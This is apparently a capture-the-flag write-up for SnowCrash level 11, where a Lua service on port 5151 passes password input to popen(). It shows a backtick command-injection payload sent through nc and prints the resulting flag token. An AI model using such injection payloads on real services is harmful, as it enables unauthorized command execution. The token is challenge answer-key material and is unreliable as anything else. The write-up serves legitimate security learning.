# LEVEL 11

- We read the level11.lua to understand that it create a webserver listening on PORT 5151
- When sending a request with nc localhost 5151 we're given a password prompt
- In the file we notice the script uses popen() function which expand shell command and get its result

```
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag` > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
